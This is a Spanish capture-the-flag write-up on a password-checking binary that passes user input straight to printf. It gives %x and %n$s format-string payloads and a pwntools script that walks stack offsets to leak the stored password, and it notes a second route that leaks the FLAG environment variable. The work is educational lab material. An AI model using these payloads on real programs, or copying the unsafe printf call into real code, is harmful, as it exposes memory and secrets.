---
author: naibu3
---

# EJERCICIO 2

## ENUNCIADO
¿Sabes cual es el formato correcto que debe tener una contraseña?

Ficheros adjuntos: vuln

## SOLUCION

Si descoompilamos el programa:

```c
void loadformato(char* buf, size_t len) {
	
	FILE *f = fopen("formato.txt","r");
	if (f == NULL) {
		printf("%s", "Parece que'formato.txt' no existe en tu ordenador (puedes crearlo para probar el programa).\n");
		fflush(stdin);
		fflush(stdout);
		exit(0);
	}

	fgets(buf,len,f); // size bound read
	fclose(f);
}

void vuln(){
	char formato[BUFSIZE];
	char buff[128];

	loadformato(formato, FLAGSIZE);

	printf("Dejame comprobar el formato de la contraseña >> ");
	scanf("%127s", buff);
	printf("Contraseña introducida: ");
	printf(buff);
	if (!strcmp(buff, formato)){
		printf("\nTu contraseña es muy segura! :)\n");
		printf("%s", getenv("FLAG"));
	}
	else{
		printf("\nDeberias cambiar la contraseña! >:(\n");
	}
	printf("\n");
}

int main(int argc, char **argv){

	setvbuf(stdout, NULL, _IONBF, 0);
	
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	vuln();
	return 0;
}

```

Veremos que hay dos funciones; `loadformato()` que carga una linea de un fichero en memoria en un array (*stack*), y otra `vuln()` que llama a la primera y nos pide que introduzcamos una contraseña, en caso de que sea igual que la linea cargada por la función anterior nos devolverá la flag (que se lee de una variable de entorno *FLAG*).

Vemos que no podemos realizar un ataque de tipo *buffer overflow* ya que el número de carácteres leídos por `scanf()` está limitado por `%127s`. Sin embargo vemos que se llama a `printf()` de la siguiente forma:

```c
printf(buff);
```

Esta línea es sensible a un *string format attack*, es decir que podríamos introducir cadenas como `%x`, que la función interprete como caracteres especiales e imprima por ejemplo los elementos del stack.

Podríamos intentar por ejemplo mandar al programa una cadena como `%x %x %x ...`, sin embargo solo veremos el primer valor (ya que *printf* solo toma hasta el primer espacio), así que la mandamos de la siguiente forma: `%x.%x.%x.%x.%x. %x.%x.%x.%x...`, obtendremos una salida como la siguiente:

```txt
Dejame comprobar el formato de la contraseña >> %x.%x.%x.%x.%x. %x.%x.%x.%x
Contraseña introducida: ffb867b0.0.80492d6.252e7825.78252e78.
Deberias cambiar la contraseña! >:(
```

Vemos que podemos ver las primeras posiciones del stack, aparentemente, si listamos suficientes posiciones podríamos ver la variable que la función *loadformato* carga en memoria:

```txt
Dejame comprobar el formato de la contraseña >> %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
Contraseña introducida: ff85bef0.0.80492d6.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.252e78.73736170.64726f77.a.f7ce0d7e.f7c12844.804bff4.804befc.
Deberias cambiar la contraseña! >:(
```

Aunque en las últimas posiciones podemos ver el valor que queremos, por muchas `%x` que añadamos no lograremos verlo completo, ya que la propia memoria se llena de `%x`. Para ello podemos utilizar otra cadena, como `%n$s`, donde *n* es la posicion de memoria a leer, y la *s* indica que se represente como una *string*.

Para poder recorrer las posiciones y ver los valores más cómodamente lo haremos mediante un script en **python** y la librería **pwntools**:

```python
#! /bin/python3
import pwn

elf=pwn.ELF("./vuln")

for i in range(1, 256):
    payload = b"".join([b"%" + str(i).encode("utf-8") + b"$s"])

    p=elf.process()

    p.recvuntil(b">>")
    p.sendline(payload)
    resp=p.recvall().decode("latin-1")
    print(resp)
```
```txt
[...]
ContraseÃ±a introducida: 
Deberias cambiar la contraseÃ±a! >:(


 ContraseÃ±a introducida: password

Deberias cambiar la contraseÃ±a! >:(


 ContraseÃ±a introducida: ¼[û÷
Deberias cambiar la contraseÃ±a! >:(
[...]
```

Podríamos filtrar las líneas por ejemplo llamando al programa con `python3 fuzzer.py SILENT=1 | grep "ContraseÃ±a introducida:"`. Pero con simplemente recorrer las líneas vemos el valor que buscamos. En este punto, con volver a ejecutar pasando dicho valor, encontraremos la flag.

Ya solo queda modificar el script para que interactue mediante **netcat** y obtener la flag real.

### UNINTENDED

Hay una solución alternativa, ya que si imprimimos más valores, podremos ver variables de entorno del sistema. Si recordamos, la flag se almacena en una variable de entorno, de forma que podremos verla directamente:

```txt
ContraseÃ±a introducida: FLAG=hfctf{FAKE_FLAG}
```